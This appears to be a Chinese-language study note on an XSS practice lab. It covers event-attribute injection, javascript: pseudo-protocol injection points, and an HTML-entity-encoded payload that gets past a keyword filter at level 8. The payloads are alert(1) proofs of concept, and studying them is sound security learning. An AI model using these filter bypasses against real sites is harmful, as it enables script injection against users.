发现：这里的  '  是原始单引号， >  和  <  被编码成了&gt和&lt ， "  被编码成了 &quot,换成单引号看看，还是不行.
原因：后端把  <  和  >  做了HTML 实体编码，把它们变成了  &lt 和  &gt 。浏览器看到的是  &ltscript&gt ，这只是一段普通的文字，不会被解析成可执行的脚本
既然不能创建新的  <script>  标签（因为  <  被禁用了），我们就只能在 现有的标签（也就是这个  <input> ）上做文章。

HTML 标签有很多 事件属性（比如鼠标点击、悬停、按下等）。这些属性不需要尖括号就能生效。

`' onclick='alert(1)`

## 超链接
超链接的本质： href  属性

在 HTML 中， <a>  标签的核心在于  href  属性（Hypertext REFerence，超文本引用）。它告诉浏览器：点击这里；去哪里？
在xss里面可以利用js伪协议执行代码

## javascript伪协议
 javascript:  是一种伪协议，告诉浏览器：冒号后面不是网址，而是一段要在当前页面上下文里执行的 JavaScript 代码
### JavaScript 伪协议常见注入点

### 以下位置如果直接拼入用户可控内容，可能触发 `javascript:` 伪协议执行。
1. `<a>` 的 `href`

```html
<a href="javascript:alert(1)">点击我</a>
```

用户点击链接时执行。

2. `<iframe>` 的 `src`

```html
<iframe src="javascript:alert(1)"></iframe>
```

iframe 加载时可能直接执行。

3. `<form>` 的 `action`

```html
<form action="javascript:alert(1)">
  <button>提交</button>
</form>
```

提交表单时执行。

4. `<button>` 的 `formaction`

```html
<button formaction="javascript:alert(1)">提交</button>
```

该按钮提交表单时执行，优先级高于 form 的 `action`。

5. `window.location`

```javascript
window.location = 'javascript:alert(1)';
```

赋值后浏览器尝试导航到该伪协议并执行。

6. 地址栏

在浏览器地址栏手动输入：

```
javascript:alert(1)
```

浏览器会尝试执行（现代浏览器对粘贴内容会剥离 `javascript:` 前缀，手动逐字输入通常仍可执行）。

## level 8
```
<form action=level8.php method=GET>
<input name=keyword  value="&quot; onclick:&quot;alert(1)">
<input type=submit name=submit value=添加友情链接 />
</form>
```
可以发现：后端PHP中对字符“script”做了过滤，并且通过测试发现， 同时存在对属性字符如“href”、“onclick”等的过滤；url中部分输入被编码

这里的注入思路是：发现在输入框输入的内容，会被带入到友情链接的href属性中，是不是可以直接输入javascript:alert(1)，点击友情链接不就可以了。

当我们输入后发现javascript被过滤了，所以使用HTML实体编码(即Unicode编码)去绕过

这里提供一个在线编码工具(也可以使用yakit里面的工具进行编码)：

[](https://www.qqxiuzi.cn/bianma/zifushiti.php)

payload：`
```
&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;(强制16进制编码)
```

关于url编码的学习：
[](https://www.runoob.com/tags/html-urlencode.html)

| 对比点 | HTML 编码 | URL 编码 |
|---|---|---|
| 别名 | HTML 实体编码 | 百分号编码 |
| 作用位置 | HTML 文档、标签内容、属性值 | URL、查询参数、表单数据 |
| 解析者 | 浏览器 HTML 解析器 | URL 解析器 / 服务器 |
| 典型格式 | `&lt;`、`&#60;`、`&#x3C;` | `%3C`、`%20`、`%26` |
| 常见用途 | 防 XSS、正确显示 `< > & " '` | 保证 URL 参数不被截断或误解 |
| 例子 | `<script>` → `&lt;script&gt;` | `a&b` → `a%26b` |
